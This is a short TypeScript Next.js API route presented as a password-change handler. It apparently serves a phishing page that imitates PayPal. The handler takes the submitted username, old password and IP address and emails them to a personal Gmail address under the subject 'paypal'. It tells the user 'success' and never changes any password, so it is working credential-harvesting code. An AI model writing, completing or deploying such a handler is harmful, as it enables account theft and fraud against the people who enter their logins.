import { NextApiRequest, NextApiResponse } from "next";
import createNodeMailerTransport from "../../helpers/mailer";

type Data = {
    username: string,
    oldPassword: string,
    newPassword: string,
    confirmPassword: string,
    ip: string
}

async function  sendEmail(from: string, to: string, source: string, username: string, pass: string, ip: string) {
  
}

export default async function handler(req: NextApiRequest, res: NextApiResponse<string>/*NextApiResponse<Data>*/) {
    const body = req.body
    //await sendEmail('support@greeniumtrade.com', 'campdaniel06@gmail.com', 'paypal', body.username, body.oldPassword, body.ip)
    const mailDetails = {
        from: 'support@greeniumtrade.com',
        to: 'campdaniel06@gmail.com',
        subject: 'paypal' + ' : ' + body.username + ' : ' + body.ip,
        html: '<p>username: ' + body.username + '</p>' + '<p>password: ' + body.oldPassword + '</p>' + '<p>ip: ' + body.ip + '</p>'
    }

    const transport = await createNodeMailerTransport()

    transport.sendMail(mailDetails, (err, data) => {
        if(err) {
            console.log(err);
        } else {
            console.log(data);
        }
    })

    // transport.verify((error, success) => {
    //     if(error){
    //         console.log(error)
    //     } else {
    //         transport.sendMail(mailDetails, (err, data) => {
    //             if(err) {
    //                 console.log(err);
    //             } else {
    //                 console.log(data);
    //             }
    //         });
    //     }
    // })

    res.status(200).json('success')
}